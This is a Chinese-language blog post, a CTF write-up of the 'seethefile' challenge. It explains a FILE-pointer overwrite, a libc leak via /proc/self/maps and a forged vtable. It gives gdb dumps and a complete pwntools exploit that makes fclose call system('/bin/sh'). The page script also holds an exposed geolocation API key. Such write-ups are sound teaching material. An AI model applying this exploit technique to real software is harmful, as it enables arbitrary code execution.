<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
    <title>CTF | IO_FILE 相关利用 - Yuuoniy&#39;s blog</title>
    
    <meta name="description" content="IO FILE 利用
seethefile 分析程序 首先看程序
 openfile:读取 长度为63 filename,打开文件,这里有溢出，因为 filename 大小为 40,但是不能覆盖到fp writefile:输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf readfile:从文件中读取内容到 0x18 长度 closefile: 这里会调用 fclose 函数，可以用来触发 exit : 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用fcolse时调用system(&quot;bin/sh&quot;)  bss data laylout
.bss:0804B080 filename db 40h dup(?) ; DATA XREF: openfile&#43;53↑o .bss:0804B080 ; openfile&#43;6D↑o ... .bss:0804B0C0 public magicbuf .bss:0804B0C0 ; char magicbuf[416] .bss:0804B0C0 magicbuf db 1A0h dup(?) ; DATA XREF: openfile&#43;33↑o .bss:0804B0C0 ; readfile&#43;17↑o ... .bss:0804B260 public name .bss:0804B260 ; char name[32] .">
    <meta name="author" content="">
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/an-old-hope.min.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/style.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/custom.css" rel="stylesheet">
    
    <link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
    <link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
    <meta name="generator" content="Hugo 0.76.5" />
    
    
    
    <script>
      function setTheme() {
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
          document.body.classList.add('dark');
          return;
        }

        const time = new Date();
        const prev = localStorage.getItem('date');
        const date = String(time.getMonth() + 1) + '.' + String(time.getDate());

        const now = time.getTime();
        let sunrise;
        let sunset;

        function setBodyClass() {
          if (now > sunrise && now < sunset) return;
          document.body.classList.add('dark');
        }

        if (date !== prev) {
          fetch('https://api.ipgeolocation.io/astronomy?apiKey=5ed37d85103e4defa5df4c5298ed5215')
            .then((res) => res.json())
            .then((data) => {
              sunrise = data.sunrise.split(':').map(Number);
              sunset = data.sunset.split(':').map(Number);
            })
            .catch(() => {
              sunrise = [7, 0];
              sunset = [19, 0];
            })
            .finally(() => {
              sunrise = time.setHours(sunrise[0], sunrise[1], 0);
              sunset = time.setHours(sunset[0], sunset[1], 0);
              setBodyClass();
              localStorage.setItem('sunrise', sunrise);
              localStorage.setItem('sunset', sunset);
            });
          localStorage.setItem('date', date);
        } else {
          sunrise = Number(localStorage.getItem('sunrise'));
          sunset = Number(localStorage.getItem('sunset'));
          setBodyClass();
        }
      }
    </script>
  </head>
  <body class="single">
    <script>
      setTheme();
    </script>
    <header class="header">
      <nav class="nav">
        <p class="logo"><a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></p>
        <ul class="menu">
          <li>
            <a href="/posts/">Posts</a>
          </li>
          <li>
            <a href="/tags/">Tags</a>
          </li>
          <li>
            <a href="/about/">About</a>
          </li>
          <li>
            <a href="/index.xml">RSS</a>
          </li>
        </ul>
      </nav>
    </header>
    <main class="main">

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<article class="post-single">
  <header class="post-header">
    <h1 class="post-title">CTF | IO_FILE 相关利用</h1>
    <div class="post-meta">2018-08-14
    </div>
  </header>
  <div class="post-toc"></div>
  <div class="post-content article-post">
    <p>IO FILE 利用</p>
<!-- raw HTML omitted -->
<h2 id="seethefile">seethefile</h2>
<h3 id="分析程序">分析程序</h3>
<p>首先看程序</p>
<ul>
<li><code>openfile</code>:读取 长度为63 <code>filename</code>,打开文件,这里有溢出，因为 <code>filename</code> 大小为 <code>40</code>,但是不能覆盖到fp</li>
<li><code>writefile</code>:输出文件 <code>magicbuf</code>，通过这个应该能泄露地址，首先要把内容写道magicbuf</li>
<li><code>readfile</code>:从文件中读取内容到 <code>0x18</code> 长度</li>
<li><code>closefile</code>: 这里会调用 <code>fclose</code> 函数，可以用来触发</li>
<li><code>exit</code> : 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用<code>fcolse</code>时调用<code>system(&quot;bin/sh&quot;)</code></li>
</ul>
<p>bss data laylout</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B080 filename        db <span style="color:#ae81ff">40</span>h dup(<span style="color:#960050;background-color:#1e0010">?</span>)           ; DATA XREF: openfile<span style="color:#f92672">+</span><span style="color:#ae81ff">53</span><span style="color:#960050;background-color:#1e0010">↑</span>o
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B080                                         ; openfile<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>D<span style="color:#960050;background-color:#1e0010">↑</span>o <span style="color:#f92672">...</span>
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B0C0                 public magicbuf
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B0C0 ; char magicbuf[<span style="color:#ae81ff">416</span>]
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B0C0 magicbuf        db <span style="color:#ae81ff">1</span>A0h dup(<span style="color:#960050;background-color:#1e0010">?</span>)          ; DATA XREF: openfile<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span><span style="color:#960050;background-color:#1e0010">↑</span>o
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B0C0                                         ; readfile<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">↑</span>o <span style="color:#f92672">...</span>
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B260                 public name
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B260 ; char name[<span style="color:#ae81ff">32</span>]
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B260 name            db <span style="color:#ae81ff">20</span>h dup(<span style="color:#960050;background-color:#1e0010">?</span>)           ; DATA XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>F<span style="color:#960050;background-color:#1e0010">↑</span>o
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B260                                         ; main<span style="color:#f92672">+</span>B4<span style="color:#960050;background-color:#1e0010">↑</span>o
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B280                 public fp
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B280 ; FILE <span style="color:#f92672">*</span>fp
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B280 fp              dd <span style="color:#960050;background-color:#1e0010">?</span>                    ; DATA XREF: openfile<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">↑</span>r
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B280                                         ; openfile<span style="color:#f92672">+</span>AD<span style="color:#960050;background-color:#1e0010">↑</span>w <span style="color:#f92672">...</span>
<span style="color:#f92672">.</span>bss:<span style="color:#ae81ff">0804</span>B280 _bss            ends
</code></pre></div><h3 id="漏洞利用">漏洞利用</h3>
<h4 id="泄露地址">泄露地址</h4>
<p>在linux系统中，文件<code>/proc/[pid]/maps</code>中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。</p>
<h4 id="构造-file">构造 FILE</h4>
<p><code>fp</code> 指向伪造 <code>IO_file</code>,伪造的 <code>IO_file</code> 存在，还要指向伪造的 <code>vtable，</code>  将<code>vtable-&gt;__fclose</code>覆盖为 system 地址
因为<code>vtable</code>中的函数调用时会把对应的<code>_IO_FILE_plus</code>指针作为第一个参数传递，因此这里我们把<code>&quot;sh&quot;</code>写入<code>_IO_FILE_plus</code>头部。
利用<code>name</code>覆盖，结构
<code>| junk | fp | IO_FILE | IO_file_jumps ptr | IO_file_jumps |</code></p>
<p>但是构造的时候需要注意：</p>
<ol>
<li><code>IO_FILE</code> 结构偏移<code>0x34</code>处即<code>_chain</code>字段指向的也是一个<code>FILE</code>结构，我们可以用我们伪造的<code>IO_FILE_plus</code>地址填充这个字段,发现不伪造也行。</li>
<li>偏移<code>0x48</code>处的<code>lock</code>字段指向的是一个<code>IO_stdfile_2_lock</code>结构，本地调试时这个结构中的数据均为<code>\x00</code>；因此，我们可以用<code>\x00</code>填充<code>name</code>，然后用<code>name</code>的地址覆盖<code>lock</code>字段。</li>
</ol>
<p>我们在 gdb 中 通过 <code>directory ~/glibc-2.23/libio</code> 就可以看到 libc 中的代码了</p>
<p>修改前：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>  p <span style="color:#f92672">*</span>((struct _IO_FILE_plus<span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x804B260</span>)             
<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> {
  file <span style="color:#f92672">=</span> {
    _flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_read_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_read_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_read_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_write_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_buf_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_buf_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9861010</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\210</span><span style="color:#e6db74">$</span><span style="color:#ae81ff">\255\373\216\024\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\025\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\021\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\021\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\021\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\021\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\021\206\t</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\025\206\t</span><span style="color:#e6db74">&#34;</span>, 
    _IO_save_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_backup_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_save_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _chain <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _fileno <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _flags2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _old_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _cur_column <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _vtable_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _shortbuf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, 
    _lock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _codecvt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _wide_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _freeres_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _freeres_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    __pad5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _mode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _unused2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">&lt;</span>repeats <span style="color:#ae81ff">39</span> times<span style="color:#f92672">&gt;</span>
  }, 
  vtable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
}
</code></pre></div><p>修改后</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>   p <span style="color:#f92672">*</span>((struct _IO_FILE_plus<span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x804B260</span>)  
<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">=</span> {
  file <span style="color:#f92672">=</span> {
    _flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6e69622f</span>, 
    _IO_read_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x68732f</span> <span style="color:#f92672">&lt;</span>error: Cannot access memory at address <span style="color:#ae81ff">0x68732f</span><span style="color:#f92672">&gt;</span>, 
    _IO_read_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_read_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_write_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_buf_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_buf_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b260</span> <span style="color:#f92672">&lt;</span>name<span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, 
    _IO_save_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_backup_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _IO_save_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _chain <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _fileno <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _flags2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _old_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _cur_column <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _vtable_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _shortbuf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, 
    _lock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b270</span> <span style="color:#f92672">&lt;</span>name<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>, 
    _offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _codecvt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _wide_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _freeres_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _freeres_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    __pad5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _mode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
    _unused2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">&lt;</span>repeats <span style="color:#ae81ff">39</span> times<span style="color:#f92672">&gt;</span>
  }, 
  vtable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b2b4</span>
}
</code></pre></div><p>vtable：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>   p <span style="color:#f92672">*</span>((struct _IO_jump_t<span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x804b2b4</span>)  
<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">=</span> {
  __dummy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __dummy2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __finish <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __overflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __underflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __uflow <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __pbackfail <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __xsputn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __xsgetn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __seekoff <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __seekpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __setbuf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __sync <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __doallocate <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __write <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __seek <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b2b4</span>, 
  __close <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7e24da0</span> <span style="color:#f92672">&lt;</span>__libc_system<span style="color:#f92672">&gt;</span>, 
  __stat <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __showmanyc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>, 
  __imbue <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
}
gef<span style="color:#960050;background-color:#1e0010">➤</span>  

</code></pre></div><p>payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./seethefile&#39;</span>
elf <span style="color:#f92672">=</span> ELF(binary)
libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc

io <span style="color:#f92672">=</span> process(binary)
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(idx):
    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;:&#39;</span>)
    io<span style="color:#f92672">.</span>sendline(str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leave_name</span>(nm):
    menu(<span style="color:#ae81ff">5</span>)
    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
    io<span style="color:#f92672">.</span>sendline(nm)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_file</span>(nm):
    menu(<span style="color:#ae81ff">1</span>)
    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
    io<span style="color:#f92672">.</span>sendline(nm)
    menu(<span style="color:#ae81ff">2</span>)
    menu(<span style="color:#ae81ff">2</span>)
    menu(<span style="color:#ae81ff">3</span>)

<span style="color:#75715e"># leak libc address </span>
read_file(<span style="color:#e6db74">&#39;/proc/self/maps&#39;</span>)
libc_addr <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;r-xp&#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(libc_addr<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;-&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[33m&#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>)


buffer <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b260</span> <span style="color:#75715e"># name&#39;s address </span>
pay <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/bin/sh&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
pay <span style="color:#f92672">+=</span> p32(buffer)
pay <span style="color:#f92672">=</span> pay<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
pay <span style="color:#f92672">+=</span> p32(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e"># make lock point to &#39;\x00&#39;</span>
pay <span style="color:#f92672">=</span> pay<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x94</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
pay <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x804b2f8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x44</span>) <span style="color:#75715e"># vtable address,0x44 is fclose&#39;s offset </span>
pay <span style="color:#f92672">+=</span> p32(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]) <span style="color:#75715e"># 0x804b260+0x94 + 4 =0x804b2f8 </span>
<span style="color:#75715e">#gdb.attach(io)</span>
leave_name(pay)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>vtable 结构</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">const struct _IO_jump_t _IO_file_jumps <span style="color:#f92672">=</span>  
{  
  JUMP_INIT_DUMMY,  
  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  
  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  
  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  
  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  
  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  
  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),
  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  
  JUMP_INIT(seekoff, _IO_new_file_seekoff),  
  JUMP_INIT(seekpos, _IO_default_seekpos),  
  JUMP_INIT(setbuf, _IO_new_file_setbuf), 
  JUMP_INIT(sync, _IO_new_file_sync),  
  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  
  JUMP_INIT(read, INTUSE(_IO_file_read)),  
  JUMP_INIT(write, _IO_new_file_write),  
  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  
  JUMP_INIT(close, INTUSE(_IO_file_close)),  
  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  
  JUMP_INIT(showmanyc, _IO_default_showmanyc),  
  JUMP_INIT(imbue, _IO_default_imbue)  
};  
</code></pre></div><p><code>IO FILE</code> 结构</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> _IO_FILE
{
  <span style="color:#66d9ef">int</span> _flags;                <span style="color:#75715e">/* High-order word is _IO_MAGIC; rest is flags. */</span>
  <span style="color:#75715e">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_ptr;        <span style="color:#75715e">/* Current read pointer */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_end;        <span style="color:#75715e">/* End of get area. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_base;        <span style="color:#75715e">/* Start of putback+get area. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_base;        <span style="color:#75715e">/* Start of put area. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_ptr;        <span style="color:#75715e">/* Current put pointer. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_end;        <span style="color:#75715e">/* End of put area. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_base;        <span style="color:#75715e">/* Start of reserve area. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_end;        <span style="color:#75715e">/* End of reserve area. */</span>
  <span style="color:#75715e">/* The following fields are used to support backing up and undo. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_base; <span style="color:#75715e">/* Pointer to start of non-current get area. */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_backup_base;  <span style="color:#75715e">/* Pointer to first valid character of backup area */</span>
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_end; <span style="color:#75715e">/* Pointer to end of non-current get area. */</span>
  <span style="color:#66d9ef">struct</span> _IO_marker <span style="color:#f92672">*</span>_markers;
  <span style="color:#66d9ef">struct</span> _IO_FILE <span style="color:#f92672">*</span>_chain;
  <span style="color:#66d9ef">int</span> _fileno;
  <span style="color:#66d9ef">int</span> _flags2;
  __off_t _old_offset; <span style="color:#75715e">/* This used to be _offset but it&#39;s too small.  */</span>
  <span style="color:#75715e">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> _cur_column;
  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">char</span> _vtable_offset;
  <span style="color:#66d9ef">char</span> _shortbuf[<span style="color:#ae81ff">1</span>];
  _IO_lock_t <span style="color:#f92672">*</span>_lock;
<span style="color:#75715e">#ifdef _IO_USE_OLD_IO_FILE
</span><span style="color:#75715e"></span>};
</code></pre></div><p><code>__flags</code> 记录 <code>FILE</code> 结构体的一些状态；
<code>_markers</code> 为指向 <code>markers</code> 结构体的指针变量，存放流的位置的单向链表；
<code>_chain</code> 变量为一个单向链表的指针，记录进程中创建的 <code>FILE</code> 结构体。</p>
<h3 id="推荐链接">推荐链接</h3>
<p><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a> 
<a href="https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/">https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/</a></p>

  </div>
  <footer class="post-footer">
  </footer>
</article>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.post-toc',
      
      contentSelector: '.post-content',
      
      headingSelector: 'h1, h2, h3, h4',
      
      positionFixedSelector: '.post-toc',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
      scrollSmooth: true,
  });
  tocbot.refresh();
</script></main>
<footer class="footer">
	<span>
		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
		
	</span>
	<span>&middot;</span>
	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
</footer>
<script src="https://yuuoniy.github.io/highlight.min.js"></script>
<script>
	hljs.initHighlightingOnLoad();
</script>
</body>
</html>

